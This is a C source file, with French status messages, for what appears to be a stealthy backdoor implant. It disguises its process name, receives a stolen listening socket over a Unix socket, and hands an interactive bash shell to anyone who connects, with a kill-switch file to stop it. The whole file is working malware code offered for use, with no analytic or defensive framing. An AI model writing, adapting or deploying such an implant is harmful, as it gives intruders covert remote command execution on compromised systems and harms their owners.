#define _GNU_SOURCE
#include "config.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/prctl.h>
#include <sys/select.h>
#include <sys/wait.h>
#include <signal.h>
#include <errno.h>

static volatile int should_run = 1;

static void signal_handler(int sig) {
    (void)sig;
    should_run = 0;
}

int receive_fd(int unix_sock) {
    struct msghdr msg = {0};
    char buf[CMSG_SPACE(sizeof(int))];
    char io_buffer[8];
    struct iovec io = { .iov_base = io_buffer, .iov_len = sizeof(io_buffer) };
    
    memset(buf, 0, sizeof(buf));
    msg.msg_iov = &io;
    msg.msg_iovlen = 1;
    msg.msg_control = buf;
    msg.msg_controllen = sizeof(buf);

    if (recvmsg(unix_sock, &msg, 0) < 0) return -1;

    struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
    if (cmsg && cmsg->cmsg_type == SCM_RIGHTS)
        return *((int *)CMSG_DATA(cmsg));
    return -1;
}

int main(int argc, char **argv) {
    int l_fd, c_fd, ghost_sk;
    struct sockaddr_un addr = { .sun_family = AF_UNIX };
    char abstract_name[128] = {0};
    
    abstract_name[0] = '\0';
    strncpy(abstract_name + 1, UNIX_BRIDGE, sizeof(abstract_name) - 2);
    memcpy(addr.sun_path, abstract_name, sizeof(addr.sun_path));
    
    signal(SIGTERM, signal_handler);
    signal(SIGINT, signal_handler);
    signal(SIGHUP, signal_handler);

    prctl(PR_SET_NAME, FAKE_THREAD_NAME, 0, 0, 0);

    l_fd = socket(AF_UNIX, SOCK_STREAM, 0);
    if (l_fd < 0) {
        perror("socket");
        return 1;
    }
    
    if (bind(l_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("bind");
        close(l_fd);
        return 1;
    }
    
    if (listen(l_fd, 1) < 0) {
        perror("listen");
        close(l_fd);
        return 1;
    }

    printf("[*] En attente du FD...\n");
    
    while (should_run) {
        fd_set fds;
        struct timeval tv = {1, 0};
        
        FD_ZERO(&fds);
        FD_SET(l_fd, &fds);
        
        int ret = select(l_fd + 1, &fds, NULL, NULL, &tv);
        if (ret < 0) {
            if (errno == EINTR) continue;
            break;
        }
        if (ret == 0) {
            if (access(KILL_SWITCH, F_OK) == 0) {
                should_run = 0;
                break;
            }
            continue;
        }
        
        c_fd = accept(l_fd, NULL, NULL);
        if (c_fd < 0) continue;
        
        ghost_sk = receive_fd(c_fd);
        close(c_fd);
        
        if (ghost_sk >= 0) break;
    }
    
    close(l_fd);

    if (ghost_sk < 0 || !should_run) {
        if (ghost_sk >= 0) close(ghost_sk);
        return 1;
    }
    
    printf("[+] Mode ghost actif sur FD %d\n", ghost_sk);

    while (should_run) {
        fd_set fds;
        struct timeval tv = {1, 0};
        
        FD_ZERO(&fds);
        FD_SET(ghost_sk, &fds);
        
        int ret = select(ghost_sk + 1, &fds, NULL, NULL, &tv);
        if (ret < 0) {
            if (errno == EINTR) continue;
            break;
        }
        if (ret == 0) {
            if (access(KILL_SWITCH, F_OK) == 0) {
                should_run = 0;
                break;
            }
            continue;
        }
        
        int cl = accept(ghost_sk, NULL, NULL);
        if (cl >= 0) {
            pid_t pid = fork();
            if (pid == 0) {
                close(ghost_sk);
                dup2(cl, 0); dup2(cl, 1); dup2(cl, 2);
                close(cl);
                execl("/bin/bash", "bash", "--noprofile", "--norc", "-i", NULL);
                exit(0);
            }
            close(cl);
            if (pid > 0) waitpid(pid, NULL, WNOHANG);
        }
    }
    
    close(ghost_sk);
    return 0;
}
